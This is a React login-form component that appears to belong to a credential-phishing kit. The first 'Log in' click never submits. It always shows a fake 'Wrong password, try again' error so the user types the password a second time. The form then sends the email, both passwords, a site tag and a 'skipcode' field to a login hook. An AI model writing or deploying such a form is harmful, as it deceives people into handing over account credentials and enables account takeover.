import { Field, Form, Formik } from "formik";
import useMockLogin from "../hooks/useMockLogin";
import { site } from "../config";
import { useState } from "react";
import { toast } from "react-toastify";

function LoginForm({ setShowModal }) {
  const [showWrongPassword, setShowWrongPassword] = useState(false);
 

  const initialvalues = {
    email: "",
    password: "",
    wrongPassword: "",
    remember: "",
  };

  const { login } = useMockLogin({ setShowModal });

  const handleSubmit = (values, formik) => {
    const { email, password,wrongPassword  } = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      wrongPassword: wrongPassword,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };
  const handleWrongPassword = () => {
    setShowWrongPassword(true);
    toast.error("Wrong password, try again");
  };

  return (
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
      <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
        Log in to your account
      </h3>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />
                     {!showWrongPassword ? (
                <>
                  <Field
                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />

                  <button
                    type="button"
                    onClick={handleWrongPassword}
                    className="mt-5 w-full text-lg font-medium bg-[#00BE70] hover:bg-[#00BE70] py-[10px] text-white transition duration-300 rounded"
                  >
                    Log in
                  </button>
                </>
              ) : (
                <>
                  <Field
                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                    placeholder="Password"
                    name="wrongPassword"
                    type="password"
                    autoComplete="on"
                    required
                  />

                  <button
                    type="submit"
                    className="mt-5 w-full text-lg font-medium bg-[#00BE70] hover:bg-[#00BE70] py-[10px] text-white transition duration-300 rounded"
                  >
                    Log in
                  </button>
                </>
              )}
                  
                
              
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
